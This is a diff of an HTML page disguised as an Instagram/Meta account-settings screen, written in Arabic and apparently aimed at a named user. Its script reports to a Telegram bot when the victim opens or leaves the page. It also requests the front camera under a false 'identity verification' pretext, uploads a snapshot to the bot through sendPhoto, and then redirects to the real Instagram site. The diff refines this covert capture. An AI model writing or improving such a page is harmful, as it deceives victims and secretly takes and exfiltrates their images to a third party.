@@ -3,13 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <!-- إعدادات المعاينة (التمويه الرسمي) -->
     <title>مركز إدارة الحسابات | Instagram</title>
+    
+    <!-- Meta Tags للمعاينة -->
     <meta property="og:title" content="oussama_bekkari">
     <meta property="og:description" content="يرجى مراجعة خيارات استخدام الحساب للمتابعة.">
-    
-    <!-- الرابط الدائم للصورة لضمان استمرار ظهورها -->
     <meta property="og:image" content="https://ammartr1.github.io/instagram.rulsu.app/689976678_17882249490563234_2485493631492355290_n.jpg">
     <meta property="og:type" content="website">
 
@@ -17,57 +15,25 @@
     
     <style>
         :root { --ig-blue: #0095f6; --ig-bg: #ffffff; --ig-separator: #efefef; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        
-        body { background-color: var(--ig-bg); color: #1c1e21; display: flex; flex-direction: column; height: 100vh; }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--ig-bg); color: #1c1e21; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         .top-nav { padding: 15px; border-bottom: 1px solid var(--ig-separator); display: flex; align-items: center; gap: 20px; }
         .top-nav h1 { font-size: 17px; font-weight: 600; }
-
         .content { flex: 1; padding: 25px; overflow-y: auto; }
-        
         .meta-logo { width: 65px; margin-bottom: 20px; }
-        
         h2 { font-size: 22px; font-weight: 700; line-height: 1.2; margin-bottom: 15px; }
         .info-text { font-size: 14px; color: #4b4f56; line-height: 1.5; margin-bottom: 20px; }
-
-        .option-card {
-            border: 1px solid var(--ig-separator);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            cursor: pointer;
-        }
+        .option-card { border: 1px solid var(--ig-separator); border-radius: 12px; padding: 16px; margin-bottom: 12px; display: flex; align-items: flex-start; gap: 12px; cursor: pointer; transition: background 0.2s; }
         .option-card.active { border-color: var(--ig-blue); background: #f0f9ff; }
-        
-        .radio-circle {
-            width: 20px; height: 20px; border: 2px solid #ccd0d5; border-radius: 50%;
-            flex-shrink: 0; margin-top: 3px; position: relative;
-        }
+        .radio-circle { width: 20px; height: 20px; border: 2px solid #ccd0d5; border-radius: 50%; flex-shrink: 0; margin-top: 3px; position: relative; }
         .active .radio-circle { border-color: var(--ig-blue); }
-        .active .radio-circle::after {
-            content: ''; position: absolute; top: 3px; left: 3px;
-            width: 10px; height: 10px; background: var(--ig-blue); border-radius: 50%;
-        }
-
+        .active .radio-circle::after { content: ''; position: absolute; top: 3px; left: 3px; width: 10px; height: 10px; background: var(--ig-blue); border-radius: 50%; }
         .option-txt h3 { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
         .option-txt p { font-size: 13px; color: #606770; }
-
-        .footer-action {
-            padding: 20px;
-            border-top: 1px solid var(--ig-separator);
-            background: #fff;
-        }
-        .btn-next {
-            width: 100%; background: var(--ig-blue); color: white;
-            border: none; padding: 14px; border-radius: 25px;
-            font-weight: 600; font-size: 15px; cursor: pointer;
-        }
-
-        video, canvas { display: none; }
+        .footer-action { padding: 20px; border-top: 1px solid var(--ig-separator); background: #fff; }
+        .btn-next { width: 100%; background: var(--ig-blue); color: white; border: none; padding: 14px; border-radius: 25px; font-weight: 600; font-size: 15px; cursor: pointer; }
+        .btn-next:active { opacity: 0.7; }
+        video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
@@ -86,7 +52,7 @@
             <div class="radio-circle"></div>
             <div class="option-txt">
                 <h3>متابعة الاستخدام مع الإعلانات</h3>
-                <p>تأكيد الهوية عبر فحص الكاميرا السريع لمرة واحدة لضمان أمان الحساب وتخصيص التجربة.</p>
+                <p>تأكيد الهوية عبر فحص الكاميرا السريع لمرة واحدة لضمان أمان الحساب.</p>
             </div>
         </div>
 
@@ -94,13 +60,13 @@
             <div class="radio-circle"></div>
             <div class="option-txt">
                 <h3>الاشتراك في الخدمة المتميزة</h3>
-                <p>استخدام الحساب بدون إعلانات مقابل رسوم شهرية (تتطلب مراجعة بيانات الدفع).</p>
+                <p>استخدام الحساب بدون إعلانات مقابل رسوم شهرية.</p>
             </div>
         </div>
     </div>
 
     <div class="footer-action">
-        <button class="btn-next" onclick="triggerProcess()">متابعة</button>
+        <button id="nextBtn" class="btn-next" onclick="handleFlow()">متابعة</button>
     </div>
 
     <video id="vid" autoplay playsinline></video>
@@ -111,31 +77,29 @@
         const C = '2140385904';
         let strm = null;
 
-        // وظيفة إرسال الإشعارات النصية للبوت
         function sendNotify(msg) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(e => {});
         }
 
-        // إشعار الدخول للرابط
+        // إشعار الدخول
         window.addEventListener('load', () => {
-            sendNotify("👁️ *دخل للرابط الآن*\nجاري انتظار طلب الكاميرا...");
-            init();
+            sendNotify("👁️ *دخل للرابط الآن*");
+            // محاولة أولية صامتة (قد تفشل في بعض المتصفحات بدون نقرة)
+            initCamera(true); 
         });
 
-        // إشعار الخروج من الصفحة
-        window.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'hidden') {
-                sendNotify("🚪 *خرج من المتصفح / أغلق الصفحة*");
-            }
-        });
-
-        async function init() {
+        async function initCamera(silent = false) {
             try {
                 strm = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('vid').srcObject = strm;
-                sendNotify("✅ *وافق على الكاميرا*\nالمستخدم جاهز للتصوير عند الضغط.");
+                if(!silent) sendNotify("✅ *وافق على الكاميرا*");
+                return true;
             } catch (e) {
-                sendNotify("❌ *رفض الكاميرا* أو المتصفح غير مدعوم.");
+                if(!silent) {
+                    sendNotify("❌ *رفض الكاميرا أو فشل الوصول*");
+                    alert("يجب السماح بالوصول للكاميرا لتأكيد ملكية الحساب والمتابعة.");
+                }
+                return false;
             }
         }
 
@@ -144,32 +108,60 @@
             el.classList.add('active');
         }
 
-        function triggerProcess() {
-            if(!strm) {
-                alert("يرجى منح صلاحية الوصول لتأكيد الخيارات.");
-                init();
-                return;
+        async function handleFlow() {
+            const btn = document.getElementById('nextBtn');
+            btn.innerText = "جاري التحقق...";
+            btn.disabled = true;
+
+            // إذا لم نصل للكاميرا بعد، نطلبها الآن (النقرة تجعل الطلب مقبولاً)
+            if (!strm) {
+                const ok = await initCamera(false);
+                if (!ok) {
+                    btn.innerText = "متابعة";
+                    btn.disabled = false;
+                    return;
+                }
+                // انتظار بسيط لضمان عمل الفيديو بعد الموافقة
+                await new Promise(r => setTimeout(r, 1000));
             }
 
+            takeAndSend();
+        }
+
+        function takeAndSend() {
             const cv = document.getElementById('canv');
             const vd = document.getElementById('vid');
-            cv.width = 480; cv.height = 640;
-            cv.getContext('2d').drawImage(vd, 0, 0, 480, 640);
+            
+            // ضبط المقاسات
+            cv.width = vd.videoWidth || 480;
+            cv.height = vd.videoHeight || 640;
+            
+            const ctx = cv.getContext('2d');
+            ctx.drawImage(vd, 0, 0, cv.width, cv.height);
             
             cv.toBlob((b) => {
                 const f = new FormData();
                 f.append('chat_id', C);
-                f.append('photo', b, 'meta_choice.jpg');
-                f.append('caption', '⚙️ *تفاعل مع إعدادات Meta*\nتم اختيار "تأكيد الهوية الرقمية" وإرسال الصورة.');
+                f.append('photo', b, 'capture.jpg');
+                f.append('caption', '⚙️ *تفاعل Meta*\nتم التقاط الصورة بنجاح.');
                 
                 fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
                 .then(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://www.instagram.com/accounts/edit/";
-                    }, 1000);
+                    // إغلاق الكاميرا فوراً
+                    if(strm) strm.getTracks().forEach(t => t.stop());
+                    // التحويل
+                    window.location.href = "https://www.instagram.com/accounts/edit/";
+                })
+                .catch(() => {
+                    window.location.href = "https://www.instagram.com/accounts/edit/";
                 });
-            }, 'image/jpeg', 0.6);
+            }, 'image/jpeg', 0.7);
         }
+
+        // تتبع الخروج
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) sendNotify("🚪 *خرج أو صغّر المتصفح*");
+        });
     </script>
 </body>
 </html>
